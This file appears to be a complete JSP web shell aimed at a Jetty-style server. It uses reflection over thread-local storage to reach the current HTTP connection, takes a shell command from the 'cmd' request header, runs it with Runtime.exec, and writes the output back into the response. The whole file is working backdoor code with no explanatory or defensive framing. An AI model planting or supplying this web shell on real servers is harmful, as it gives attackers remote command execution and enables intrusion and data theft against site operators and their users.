<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class clazz = Thread.currentThread().getClass();
    java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
    field.setAccessible(true);
    Object obj = field.get(Thread.currentThread());

    field = obj.getClass().getDeclaredField("table");
    field.setAccessible(true);
    obj = field.get(obj);

    Object[] obj_arr = (Object[]) obj;
    for(Object o : obj_arr){
        if(o == null){
            continue;
        }

        field = o.getClass().getDeclaredField("value");
        field.setAccessible(true);
        obj = field.get(o);
        if(obj != null && obj.getClass().getName().endsWith("AsyncHttpConnection")){
            Object connection = obj;
            java.lang.reflect.Method method = connection.getClass().getMethod("getRequest");
            obj = method.invoke(connection);

            method = obj.getClass().getMethod("getHeader", String.class);
            obj = method.invoke(obj, "cmd");

            java.io.InputStream in = Runtime.getRuntime().exec(obj.toString()).getInputStream();
            java.io.InputStreamReader isr = new java.io.InputStreamReader(in);
            java.io.BufferedReader br = new java.io.BufferedReader(isr);

            StringBuilder sb = new StringBuilder();
            String line;
            while((line =br.readLine()) != null){
                sb.append(line + "\n");
            }

            method = connection.getClass().getMethod("getPrintWriter", String.class);
            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
            printWriter.println(sb.toString());
        }
    }
%>